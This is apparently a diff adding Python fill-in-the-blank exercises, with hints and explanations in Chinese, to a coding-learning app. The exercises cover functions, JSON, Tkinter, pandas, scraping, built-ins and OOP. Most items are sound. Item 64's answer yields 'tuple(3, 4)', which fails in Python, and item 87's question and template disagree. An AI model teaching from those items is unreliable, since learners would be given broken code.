+            explanation: "📌 默认参数让函数调用更灵活。\n\n🔹 语法：def func(arg=默认值)\n💡 默认参数必须放在必需参数后面"
+        },
+        {
+            id: 34,
+            title: "返回多值",
+            description: "函数返回多个值",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，返回两个值",
+            template: "def get_size():\n    ___ 100, 200\n\nw, h = get_size()",
+            answer: "return",
+            hint: "返回值的关键字？",
+            explanation: "📌 Python函数可以返回多个值。\n\n🔹 实际上返回的是元组\n🔹 可以用多个变量接收"
+        },
+        {
+            id: 35,
+            title: "lambda表达式",
+            description: "匿名函数",
+            difficulty: 3,
+            xp: 30,
+            question: "补全代码，创建求平方的匿名函数",
+            template: "square = ___ x: x**2\nprint(square(5))  # 25",
+            answer: "lambda",
+            hint: "创建匿名函数的关键字？",
+            explanation: "📌 lambda创建简单的匿名函数。\n\n🔹 语法：lambda 参数: 表达式\n💡 常与map/filter/sorted配合使用"
+        },
+        // ===== 文件和JSON =====
+        {
+            id: 36,
+            title: "写入文件",
+            description: "将内容写入文件",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，以写入模式打开文件",
+            template: "with open('data.txt', ___) as f:\n    f.write('Hello')",
+            answer: "'w'",
+            hint: "写入模式用什么字母？",
+            explanation: "📌 写入模式会清空原文件内容。\n\n🔹 'w' - 覆盖写入\n🔹 'a' - 追加写入\n💡 写入后记得换行：f.write('\\n')"
+        },
+        {
+            id: 37,
+            title: "JSON读取",
+            description: "读取JSON文件",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，从文件加载JSON",
+            template: "import json\n\nwith open('config.json', 'r') as f:\n    data = json.___(f)",
+            answer: "load",
+            hint: "从文件读取JSON的方法？",
+            explanation: "📌 json模块处理JSON数据。\n\n🔹 json.load(f) - 从文件读取\n🔹 json.loads(s) - 从字符串读取\n🔹 json.dump() - 写入文件\n🔹 json.dumps() - 转为字符串"
+        },
+        {
+            id: 38,
+            title: "JSON写入",
+            description: "写入JSON文件",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，将数据写入JSON文件",
+            template: "import json\ndata = {'name': '小明'}\n\nwith open('data.json', 'w') as f:\n    json.___(data, f)",
+            answer: "dump",
+            hint: "写入JSON到文件的方法？",
+            explanation: "📌 dump()将数据写入JSON文件。\n\n🔹 常用参数：\n• ensure_ascii=False → 支持中文\n• indent=2 → 格式化缩进"
+        },
+        // ===== Tkinter进阶 =====
+        {
+            id: 39,
+            title: "Tkinter标签",
+            description: "显示文本",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，创建文本标签",
+            template: "import tkinter as tk\nroot = tk.Tk()\nlabel = tk.___(root, text='你好')\nlabel.pack()",
+            answer: "Label",
+            hint: "显示文本的组件叫什么？",
+            explanation: "📌 Label用于显示文本或图片。\n\n🔹 常用参数：\n• text - 文本内容\n• font - 字体\n• fg/bg - 前景/背景色"
+        },
+        {
+            id: 40,
+            title: "Tkinter按钮",
+            description: "创建按钮",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，创建点击按钮",
+            template: "import tkinter as tk\nroot = tk.Tk()\nbtn = tk.___(root, text='点击', command=onClick)\nbtn.pack()",
+            answer: "Button",
+            hint: "按钮组件叫什么？",
+            explanation: "📌 Button创建可点击的按钮。\n\n🔹 command参数指定点击时调用的函数\n💡 函数名不加括号，只传引用"
+        },
+        {
+            id: 41,
+            title: "Tkinter输入框",
+            description: "获取用户输入",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，创建单行输入框",
+            template: "import tkinter as tk\nroot = tk.Tk()\nentry = tk.___(root)\nentry.pack()",
+            answer: "Entry",
+            hint: "单行输入框叫什么？",
+            explanation: "📌 Entry是单行文本输入框。\n\n🔹 获取内容：entry.get()\n🔹 清空：entry.delete(0, 'end')\n🔹 设置：entry.insert(0, '文本')"
+        },
+        {
+            id: 42,
+            title: "布局pack",
+            description: "简单布局",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，让组件显示出来",
+            template: "label = tk.Label(root, text='你好')\nlabel.___()",
+            answer: "pack",
+            hint: "最简单的布局方法？",
+            explanation: "📌 pack()是最简单的布局方式。\n\n🔹 side参数：TOP/BOTTOM/LEFT/RIGHT\n🔹 fill参数：X/Y/BOTH\n🔹 expand=True 填充额外空间"
+        },
+        // ===== Pandas进阶 =====
+        {
+            id: 43,
+            title: "DataFrame创建",
+            description: "创建数据表",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，从字典创建DataFrame",
+            template: "import pandas as pd\ndata = {'name': ['张三', '李四']}\ndf = pd.___(data)",
+            answer: "DataFrame",
+            hint: "Pandas的核心数据结构？",
+            explanation: "📌 DataFrame是Pandas的核心。\n\n🔹 类似Excel表格\n🔹 可从字典、列表、文件创建"
+        },
+        {
+            id: 44,
+            title: "选择列",
+            description: "获取DataFrame列",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，获取name列",
+            template: "names = df[___]\nprint(names)",
+            answer: "'name'",
+            hint: "用列名字符串选择列",
+            explanation: "📌 选择DataFrame的列：\n\n🔹 df['列名'] - 单列\n🔹 df[['列1','列2']] - 多列"
+        },
+        {
+            id: 45,
+            title: "筛选行",
+            description: "按条件筛选",
+            difficulty: 3,
+            xp: 30,
+            question: "补全代码，筛选年龄大于18的行",
+            template: "result = df[df['age'] ___ 18]",
+            answer: ">",
+            hint: "大于用什么符号？",
+            explanation: "📌 条件筛选DataFrame行：\n\n🔹 df[df['列'] > 值]\n🔹 多条件用 & 和 | \n🔹 df[(条件1) & (条件2)]"
+        },
+        {
+            id: 46,
+            title: "保存Excel",
+            description: "导出到Excel",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，保存DataFrame到Excel",
+            template: "df.___('output.xlsx', index=False)",
+            answer: "to_excel",
+            hint: "保存Excel的方法以to_开头",
+            explanation: "📌 to_excel()保存为Excel文件。\n\n🔹 index=False 不保存索引列\n🔹 类似的：to_csv(), to_json()"
+        },
+        // ===== 爬虫进阶 =====
+        {
+            id: 47,
+            title: "请求头设置",
+            description: "模拟浏览器",
+            difficulty: 3,
+            xp: 30,
+            question: "补全代码，添加请求头",
+            template: "headers = {'User-Agent': 'Mozilla/5.0'}\nresponse = requests.get(url, ___=headers)",
+            answer: "headers",
+            hint: "传递请求头的参数名？",
+            explanation: "📌 请求头模拟浏览器访问。\n\n🔹 User-Agent最重要\n🔹 可以添加Cookie、Referer等\n\n🎯 这是反爬的基础应对策略"
+        },
+        {
+            id: 48,
+            title: "状态码检查",
+            description: "判断请求成功",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，检查请求是否成功",
+            template: "if response.___ == 200:\n    print('成功')",
+            answer: "status_code",
+            hint: "HTTP状态码的属性名？",
+            explanation: "📌 常见HTTP状态码：\n\n🔹 200 - 成功\n🔹 404 - 未找到\n🔹 403 - 禁止访问\n🔹 500 - 服务器错误"
+        },
+        {
+            id: 49,
+            title: "获取属性",
+            description: "提取HTML属性",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，获取a标签的href属性",
+            template: "link = soup.find('a')\nurl = link[___]",
+            answer: "'href'",
+            hint: "像字典一样获取属性",
+            explanation: "📌 获取HTML元素属性：\n\n🔹 element['属性名']\n🔹 element.get('属性名', 默认值)"
+        },
+        {
+            id: 50,
+            title: "CSS选择器",
+            description: "精确选择元素",
+            difficulty: 3,
+            xp: 30,
+            question: "补全代码，用CSS选择器查找",
+            template: "items = soup.___('div.content')",
+            answer: "select",
+            hint: "CSS选择器方法名？",
+            explanation: "📌 select()使用CSS选择器。\n\n🔹 '.class' - 类选择器\n🔹 '#id' - ID选择器\n🔹 'div > p' - 直接子元素"
+        },
+        // ===== 类型转换 =====
+        {
+            id: 51,
+            title: "转整数",
+            description: "字符串转数字",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，将字符串转为整数",
+            template: "s = '123'\nnum = ___(s)\nprint(num + 1)  # 124",
+            answer: "int",
+            hint: "整数的英文缩写？",
+            explanation: "📌 int()将值转为整数。\n\n🔹 int('123') → 123\n🔹 int(3.7) → 3（截断）\n🔹 int('12', 16) → 18（16进制）"
+        },
+        {
+            id: 52,
+            title: "转字符串",
+            description: "数字转字符串",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，将数字转为字符串",
+            template: "num = 123\ns = ___(num)\nprint('数字是：' + s)",
+            answer: "str",
+            hint: "字符串的英文缩写？",
+            explanation: "📌 str()将值转为字符串。\n\n🔹 str(123) → '123'\n🔹 str(3.14) → '3.14'\n🔹 str([1,2]) → '[1, 2]'"
+        },
+        {
+            id: 53,
+            title: "转浮点数",
+            description: "转为小数",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，将字符串转为浮点数",
+            template: "s = '3.14'\npi = ___(s)\nprint(pi * 2)",
+            answer: "float",
+            hint: "浮点数的英文？",
+            explanation: "📌 float()转为浮点数。\n\n🔹 float('3.14') → 3.14\n🔹 float(3) → 3.0"
+        },
+        {
+            id: 54,
+            title: "转列表",
+            description: "字符串转列表",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，将字符串转为字符列表",
+            template: "s = 'hello'\nchars = ___(s)\nprint(chars)  # ['h','e','l','l','o']",
+            answer: "list",
+            hint: "列表的英文？",
+            explanation: "📌 list()将可迭代对象转为列表。\n\n🔹 list('abc') → ['a','b','c']\n🔹 list(range(3)) → [0,1,2]"
+        },
+        {
+            id: 55,
+            title: "转布尔值",
+            description: "判断真假",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，判断值是否为真",
+            template: "if ___(1):\n    print('真')",
+            answer: "bool",
+            hint: "布尔的英文？",
+            explanation: "📌 bool()转为布尔值。\n\n🔹 假值：0, '', [], {}, None\n🔹 其他都是True"
+        },
+        // ===== 字符串格式化 =====
+        {
+            id: 56,
+            title: "f-string",
+            description: "格式化字符串",
+            difficulty: 1,
+            xp: 15,
+            question: "补全代码，使用f-string格式化",
+            template: "name = '小明'\nage = 18\nprint(___'{name}今年{age}岁')",
+            answer: "f",
+            hint: "f-string以什么字母开头？",
+            explanation: "📌 f-string是最现代的格式化方式。\n\n🔹 f'{变量}' 直接嵌入变量\n🔹 f'{1+1}' 可以计算表达式\n🔹 f'{x:.2f}' 保留2位小数"
+        },
+        {
+            id: 57,
+            title: "format方法",
+            description: "字符串格式化",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，用format格式化",
+            template: "text = '{}今年{}岁'.___('小明', 18)\nprint(text)",
+            answer: "format",
+            hint: "格式化方法名？",
+            explanation: "📌 format()是通用的格式化方法。\n\n🔹 '{} {}'.format(a, b)\n🔹 '{0} {1}'.format(a, b) 指定位置\n🔹 '{name}'.format(name='值') 命名参数"
+        },
+        {
+            id: 58,
+            title: "大写转换",
+            description: "字符串转大写",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，将字符串转为大写",
+            template: "s = 'hello'\nprint(s.___())  # HELLO",
+            answer: "upper",
+            hint: "大写的英文？",
+            explanation: "📌 大小写转换方法：\n\n🔹 upper() - 全大写\n🔹 lower() - 全小写\n🔹 title() - 首字母大写\n🔹 capitalize() - 句首大写"
+        },
+        {
+            id: 59,
+            title: "字符串查找",
+            description: "查找子串位置",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，查找子串首次出现位置",
+            template: "s = 'hello world'\npos = s.___('world')\nprint(pos)  # 6",
+            answer: "find",
+            hint: "查找的英文？",
+            explanation: "📌 find()返回子串位置。\n\n🔹 找到返回索引\n🔹 找不到返回-1\n🔹 index()类似但找不到会报错"
+        },
+        {
+            id: 60,
+            title: "字符串判断",
+            description: "判断是否全是数字",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，判断字符串是否全是数字",
+            template: "s = '12345'\nif s.___():\n    print('全是数字')",
+            answer: "isdigit",
+            hint: "is开头，数字是digit",
+            explanation: "📌 字符串判断方法：\n\n🔹 isdigit() - 全是数字\n🔹 isalpha() - 全是字母\n🔹 isalnum() - 字母或数字\n🔹 isspace() - 全是空白"
+        },
+        // ===== 集合操作 =====
+        {
+            id: 61,
+            title: "创建集合",
+            description: "使用set",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，创建一个集合",
+            template: "nums = ___([1, 2, 2, 3, 3, 3])\nprint(nums)  # {1, 2, 3}",
+            answer: "set",
+            hint: "集合的英文？",
+            explanation: "📌 set是无序不重复的集合。\n\n🔹 自动去重\n🔹 可用于列表去重\n🔹 支持集合运算（交集、并集）"
+        },
+        {
+            id: 62,
+            title: "集合添加",
+            description: "向集合添加元素",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，向集合添加元素",
+            template: "s = {1, 2, 3}\ns.___(4)\nprint(s)",
+            answer: "add",
+            hint: "添加单个元素的方法？",
+            explanation: "📌 集合添加方法：\n\n🔹 add(x) - 添加一个元素\n🔹 update([x,y]) - 添加多个\n🔹 已存在的元素不会重复添加"
+        },
+        {
+            id: 63,
+            title: "集合交集",
+            description: "两个集合的公共元素",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，求两个集合的交集",
+            template: "a = {1, 2, 3}\nb = {2, 3, 4}\nprint(a.___(b))  # {2, 3}",
+            answer: "intersection",
+            hint: "交集的英文？或用 &",
+            explanation: "📌 集合运算：\n\n🔹 intersection() 或 & → 交集\n🔹 union() 或 | → 并集\n🔹 difference() 或 - → 差集"
+        },
+        // ===== 元组 =====
+        {
+            id: 64,
+            title: "创建元组",
+            description: "不可变序列",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，创建元组",
+            template: "point = ___(3, 4)\nprint(point[0])  # 3",
+            answer: "tuple",
+            hint: "元组的英文？或直接用小括号",
+            explanation: "📌 元组是不可变的序列。\n\n🔹 创建：(1, 2) 或 tuple([1,2])\n🔹 单元素：(1,) 注意逗号\n🔹 不能修改，但可以拆包"
+        },
+        {
+            id: 65,
+            title: "元组拆包",
+            description: "分别赋值",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，交换两个变量的值",
+            template: "a = 1\nb = 2\na, b = ___, ___\nprint(a, b)  # 2 1",
+            answer: "b, a",
+            hint: "直接交换位置",
+            explanation: "📌 Python独特的交换方式。\n\n🔹 a, b = b, a 一行交换\n🔹 实际上是元组拆包\n🔹 无需临时变量"
+        },
+        // ===== 更多内置函数 =====
+        {
+            id: 66,
+            title: "求最大值",
+            description: "找出最大的",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，找出列表中的最大值",
+            template: "nums = [3, 1, 4, 1, 5]\nprint(___(nums))  # 5",
+            answer: "max",
+            hint: "最大的英文缩写？",
+            explanation: "📌 max()求最大值。\n\n🔹 max([1,2,3]) → 3\n🔹 max(1, 2, 3) → 3\n🔹 max(列表, key=函数) 自定义比较"
+        },
+        {
+            id: 67,
+            title: "求最小值",
+            description: "找出最小的",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，找出列表中的最小值",
+            template: "nums = [3, 1, 4, 1, 5]\nprint(___(nums))  # 1",
+            answer: "min",
+            hint: "最小的英文缩写？",
+            explanation: "📌 min()求最小值。\n\n🔹 用法同max()\n🔹 可用于字符串比较（按字典序）"
+        },
+        {
+            id: 68,
+            title: "求和",
+            description: "计算总和",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，计算列表元素的和",
+            template: "nums = [1, 2, 3, 4, 5]\nprint(___(nums))  # 15",
+            answer: "sum",
+            hint: "求和的英文？",
+            explanation: "📌 sum()计算可迭代对象的和。\n\n🔹 sum([1,2,3]) → 6\n🔹 sum(range(101)) → 5050\n🔹 sum(列表, 起始值)"
+        },
+        {
+            id: 69,
+            title: "绝对值",
+            description: "求绝对值",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，求绝对值",
+            template: "x = -5\nprint(___(x))  # 5",
+            answer: "abs",
+            hint: "绝对值absolute的缩写？",
+            explanation: "📌 abs()求绝对值。\n\n🔹 abs(-5) → 5\n🔹 abs(3.14) → 3.14\n🔹 也适用于复数"
+        },
+        {
+            id: 70,
+            title: "四舍五入",
+            description: "取整数",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，四舍五入保留整数",
+            template: "x = 3.7\nprint(___(x))  # 4",
+            answer: "round",
+            hint: "四舍五入的英文？",
+            explanation: "📌 round()四舍五入。\n\n🔹 round(3.7) → 4\n🔹 round(3.1415, 2) → 3.14\n🔹 注意银行家舍入法"
+        },
+        {
+            id: 71,
+            title: "枚举索引",
+            description: "同时获取索引和值",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，遍历时获取索引",
+            template: "fruits = ['苹果', '香蕉']\nfor i, f in ___(fruits):\n    print(i, f)",
+            answer: "enumerate",
+            hint: "枚举的英文？",
+            explanation: "📌 enumerate()返回索引和值。\n\n🔹 for i, v in enumerate(list):\n🔹 可指定起始索引：enumerate(list, 1)"
+        },
+        {
+            id: 72,
+            title: "并行遍历",
+            description: "同时遍历多个列表",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，同时遍历两个列表",
+            template: "a = [1, 2, 3]\nb = ['a', 'b', 'c']\nfor x, y in ___(a, b):\n    print(x, y)",
+            answer: "zip",
+            hint: "拉链的英文？",
+            explanation: "📌 zip()并行遍历多个序列。\n\n🔹 长度不一时取最短的\n🔹 可用于字典创建：dict(zip(keys, values))"
+        },
+        {
+            id: 73,
+            title: "map映射",
+            description: "对每个元素应用函数",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，将列表每个数字平方",
+            template: "nums = [1, 2, 3]\nresult = list(___(lambda x: x**2, nums))\nprint(result)  # [1, 4, 9]",
+            answer: "map",
+            hint: "映射的英文？",
+            explanation: "📌 map()对每个元素应用函数。\n\n🔹 map(函数, 序列)\n🔹 返回迭代器，需list()转换\n🔹 常与lambda配合"
+        },
+        {
+            id: 74,
+            title: "filter过滤",
+            description: "筛选符合条件的元素",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，筛选出偶数",
+            template: "nums = [1, 2, 3, 4, 5]\nresult = list(___(lambda x: x%2==0, nums))\nprint(result)  # [2, 4]",
+            answer: "filter",
+            hint: "过滤的英文？",
+            explanation: "📌 filter()筛选符合条件的元素。\n\n🔹 filter(条件函数, 序列)\n🔹 条件函数返回True的元素保留"
+        },
+        {
+            id: 75,
+            title: "sorted排序",
+            description: "返回新的有序列表",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，对列表排序（不改变原列表）",
+            template: "nums = [3, 1, 4]\nnew_nums = ___(nums)\nprint(new_nums)  # [1, 3, 4]",
+            answer: "sorted",
+            hint: "sort的过去式？",
+            explanation: "📌 sorted()返回新的有序列表。\n\n🔹 原列表不变\n🔹 sorted(x, reverse=True) 降序\n🔹 sorted(x, key=len) 按长度排序"
+        },
+        // ===== 更多技巧 =====
+        {
+            id: 76,
+            title: "any判断",
+            description: "任一为True",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，判断是否有任一元素为True",
+            template: "nums = [0, 0, 1, 0]\nif ___(nums):\n    print('有真值')",
+            answer: "any",
+            hint: "任一的英文？",
+            explanation: "📌 any()判断是否有任一True。\n\n🔹 any([False,True,False]) → True\n🔹 any([]) → False\n🔹 常用于条件判断"
+        },
+        {
+            id: 77,
+            title: "all判断",
+            description: "全部为True",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，判断是否全部为True",
+            template: "nums = [1, 2, 3]\nif ___(nums):\n    print('全为真')",
+            answer: "all",
+            hint: "全部的英文？",
+            explanation: "📌 all()判断是否全部True。\n\n🔹 all([True,True,True]) → True\n🔹 all([True,False]) → False\n🔹 all([]) → True（空为真）"
+        },
+        {
+            id: 78,
+            title: "isinstance类型检查",
+            description: "检查类型",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，检查是否是字符串类型",
+            template: "x = 'hello'\nif ___(x, str):\n    print('是字符串')",
+            answer: "isinstance",
+            hint: "is instance of...",
+            explanation: "📌 isinstance()检查类型。\n\n🔹 isinstance(x, int)\n🔹 isinstance(x, (int, float)) 多类型\n🔹 比type()更推荐"
+        },
+        {
+            id: 79,
+            title: "input输入",
+            description: "获取用户输入",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，获取用户输入的名字",
+            template: "name = ___('请输入你的名字：')\nprint('你好，' + name)",
+            answer: "input",
+            hint: "输入的英文？",
+            explanation: "📌 input()获取用户输入。\n\n🔹 返回字符串类型\n🔹 需要数字时要转换：int(input())"
+        },
+        {
+            id: 80,
+            title: "type类型",
+            description: "获取类型",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，获取变量的类型",
+            template: "x = 123\nprint(___(x))  # <class 'int'>",
+            answer: "type",
+            hint: "类型的英文？",
+            explanation: "📌 type()返回对象类型。\n\n🔹 type(123) → <class 'int'>\n🔹 type('a') → <class 'str'>\n🔹 用于调试"
+        },
+        // ===== 更多字符串 =====
+        {
+            id: 81,
+            title: "startswith",
+            description: "判断开头",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，判断字符串是否以'http'开头",
+            template: "url = 'https://example.com'\nif url.___('http'):\n    print('是网址')",
+            answer: "startswith",
+            hint: "以...开始",
+            explanation: "📌 startswith()判断开头。\n\n🔹 s.startswith('前缀')\n🔹 可传入元组检查多个：s.startswith(('http','https'))"
+        },
+        {
+            id: 82,
+            title: "endswith",
+            description: "判断结尾",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，判断文件是否是.py结尾",
+            template: "filename = 'test.py'\nif filename.___('.py'):\n    print('是Python文件')",
+            answer: "endswith",
+            hint: "以...结束",
+            explanation: "📌 endswith()判断结尾。\n\n🔹 常用于检查文件扩展名\n🔹 可传入元组检查多个"
+        },
+        {
+            id: 83,
+            title: "count计数",
+            description: "统计出现次数",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，统计字母a出现的次数",
+            template: "s = 'abracadabra'\nprint(s.___('a'))  # 5",
+            answer: "count",
+            hint: "计数的英文？",
+            explanation: "📌 count()统计出现次数。\n\n🔹 字符串和列表都有此方法\n🔹 s.count('子串')\n🔹 list.count(元素)"
+        },
+        {
+            id: 84,
+            title: "center居中",
+            description: "字符串居中填充",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，将字符串居中到10个字符宽",
+            template: "s = 'hello'\nprint(s.___(10, '*'))  # **hello***",
+            answer: "center",
+            hint: "居中的英文？",
+            explanation: "📌 字符串填充方法：\n\n🔹 center(宽度, 填充字符) - 居中\n🔹 ljust() - 左对齐\n🔹 rjust() - 右对齐\n🔹 zfill() - 左边填0"
+        },
+        // ===== 更多列表 =====
+        {
+            id: 85,
+            title: "列表复制",
+            description: "创建列表副本",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，复制列表",
+            template: "a = [1, 2, 3]\nb = a.___()\nb.append(4)\nprint(a)  # [1, 2, 3] 原列表不变",
+            answer: "copy",
+            hint: "复制的英文？",
+            explanation: "📌 copy()创建浅拷贝。\n\n🔹 b = a.copy() 或 b = a[:]\n🔹 浅拷贝只复制一层\n🔹 深拷贝用copy.deepcopy()"
+        },
+        {
+            id: 86,
+            title: "列表清空",
+            description: "删除所有元素",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，清空列表",
+            template: "nums = [1, 2, 3]\nnums.___()\nprint(nums)  # []",
+            answer: "clear",
+            hint: "清除的英文？",
+            explanation: "📌 clear()清空列表。\n\n🔹 等同于 del nums[:]\n🔹 字典也有clear()方法"
+        },
+        {
+            id: 87,
+            title: "列表插入",
+            description: "在指定位置插入",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，在索引1处插入'x'",
+            template: "a = ['a', 'c']\na.___(1, 'b')\nprint(a)  # ['a', 'b', 'c']",
+            answer: "insert",
+            hint: "插入的英文？",
+            explanation: "📌 insert(索引, 元素)在指定位置插入。\n\n🔹 insert(0, x) 插入开头\n🔹 insert(len(a), x) 等同append"
+        },
+        {
+            id: 88,
+            title: "列表弹出",
+            description: "删除并返回元素",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，删除并返回最后一个元素",
+            template: "nums = [1, 2, 3]\nlast = nums.___()\nprint(last)  # 3",
+            answer: "pop",
+            hint: "弹出的英文？",
+            explanation: "📌 pop()删除并返回元素。\n\n🔹 pop() - 最后一个\n🔹 pop(0) - 第一个\n🔹 pop(i) - 指定索引"
+        },
+        // ===== 更多逻辑 =====
+        {
+            id: 89,
+            title: "三元表达式",
+            description: "简洁的条件判断",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，用三元表达式判断奇偶",
+            template: "x = 5\nresult = '奇数' ___ x % 2 else '偶数'\nprint(result)",
+            answer: "if",
+            hint: "条件表达式的关键字？",
+            explanation: "📌 三元表达式：值1 if 条件 else 值2\n\n🔹 result = a if a > b else b\n🔹 简化if-else为一行\n🔹 可以嵌套但不推荐"
+        },
+        {
+            id: 90,
+            title: "in成员检查",
+            description: "判断元素是否存在",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，判断元素是否在列表中",
+            template: "fruits = ['苹果', '香蕉']\nif '苹果' ___ fruits:\n    print('有苹果')",
+            answer: "in",
+            hint: "在...里面",
+            explanation: "📌 in判断成员关系。\n\n🔹 x in list - 在列表中\n🔹 key in dict - 键在字典中\n🔹 char in str - 字符在字符串中"
+        },
+        {
+            id: 91,
+            title: "not in排除",
+            description: "判断元素不存在",
+            difficulty: 1,
+            xp: 10,
+            question: "补全代码，判断元素不在列表中",
+            template: "fruits = ['苹果', '香蕉']\nif '橙子' ___ fruits:\n    print('没有橙子')",
+            answer: "not in",
+            hint: "不在...里面",
+            explanation: "📌 not in判断不存在。\n\n🔹 与 in 相反\n🔹 常用于过滤检查"
+        },
+        {
+            id: 92,
+            title: "is比较",
+            description: "判断是否同一对象",
+            difficulty: 2,
+            xp: 15,
+            question: "补全代码，判断变量是否为None",
+            template: "x = None\nif x ___ None:\n    print('是空值')",
+            answer: "is",
+            hint: "是否同一对象？",
+            explanation: "📌 is判断是否同一对象。\n\n🔹 x is None（推荐）\n🔹 x == None（不推荐）\n🔹 is比较内存地址，==比较值"
+        },
+        // ===== 更多异常 =====
+        {
+            id: 93,
+            title: "finally始终执行",
+            description: "无论如何都执行",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，确保资源被释放",
+            template: "try:\n    f = open('file.txt')\nexcept:\n    pass\n___:\n    print('清理资源')",
+            answer: "finally",
+            hint: "最终的英文？",
+            explanation: "📌 finally块始终执行。\n\n🔹 常用于清理资源\n🔹 即使有return也会执行\n🔹 文件操作推荐用with"
+        },
+        {
+            id: 94,
+            title: "raise抛出异常",
+            description: "主动引发错误",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，主动抛出异常",
+            template: "age = -1\nif age < 0:\n    ___ ValueError('年龄不能为负')",
+            answer: "raise",
+            hint: "抛出的英文？",
+            explanation: "📌 raise主动抛出异常。\n\n🔹 raise 异常类型('消息')\n🔹 用于参数验证\n🔹 可以自定义异常类"
+        },
+        // ===== 更多OOP =====
+        {
+            id: 95,
+            title: "self参数",
+            description: "类方法的第一个参数",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，定义类的方法",
+            template: "class Dog:\n    def bark(___):\n        print('汪汪！')",
+            answer: "self",
+            hint: "代表实例自身的参数？",
+            explanation: "📌 self代表类的实例。\n\n🔹 必须是第一个参数\n🔹 通过self访问属性和方法\n🔹 类似其他语言的this"
+        },
+        {
+            id: 96,
+            title: "__init__构造",
+            description: "初始化方法",
+            difficulty: 3,
+            xp: 25,
+            question: "补全代码，定义构造方法",
+            template: "class Person:\n    def ___(self, name):\n        self.name = name",
+            answer: "__init__",
+            hint: "初始化方法的名称？",
+            explanation: "📌 __init__是构造方法。\n\n🔹 创建对象时自动调用\n🔹 用于初始化属性\n🔹 双下划线开头结尾是魔术方法"
+        },
+        {
+            id: 97,
+            title: "继承",
+            description: "类的继承",
+            difficulty: 3,
+            xp: 30,
+            question: "补全代码，让Dog继承Animal类",
+            template: "class Animal:\n    pass\n\nclass Dog(___):\n    pass",
+            answer: "Animal",
+            hint: "填入父类名",
+            explanation: "📌 继承让子类拥有父类的属性和方法。\n\n🔹 class 子类(父类):\n🔹 可以重写父类方法\n🔹 super()调用父类方法"
+        },
+        {
+            id: 98,
+            title: "super调用",
+            description: "调用父类方法",
+            difficulty: 3,
+            xp: 30,
+            question: "补全代码，调用父类的__init__",
+            template: "class Dog(Animal):\n    def __init__(self, name):\n        ___.__init__(name)\n        self.species = 'dog'",
+            answer: "super()",
+            hint: "超类的英文？",
+            explanation: "📌 super()调用父类。\n\n🔹 super().__init__() 调用父类构造\n🔹 super().方法() 调用父类方法\n🔹 多继承时按MRO顺序"
+        },
+        // ===== 实用技巧 =====
+        {
+            id: 99,
+            title: "列表解包",
+            description: "展开列表",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，将列表展开传入函数",
+            template: "def add(a, b, c):\n    return a + b + c\n\nnums = [1, 2, 3]\nprint(add(___nums))",
+            answer: "*",
+            hint: "用什么符号展开列表？",
+            explanation: "📌 *展开列表，**展开字典。\n\n🔹 func(*list) 展开为位置参数\n🔹 func(**dict) 展开为关键字参数\n🔹 [*a, *b] 合并列表"
+        },
+        {
+            id: 100,
+            title: "字典解包",
+            description: "展开字典",
+            difficulty: 2,
+            xp: 20,
+            question: "补全代码，合并两个字典",
+            template: "a = {'x': 1}\nb = {'y': 2}\nc = {___a, ___b}\nprint(c)  # {'x': 1, 'y': 2}",
+            answer: "**",
+            hint: "字典解包用几个星号？",
+            explanation: "📌 **展开字典。\n\n🔹 {**d1, **d2} 合并字典\n🔹 Python 3.9+可用 d1 | d2\n🔹 相同键后面覆盖前面"
+        },
+        // ===== 正则表达式 =====
+        {
+            id: 101,
+            title: "匹配数字",
+            description: "正则匹配所有数字",
+            difficulty: 2,
+            xp: 25,
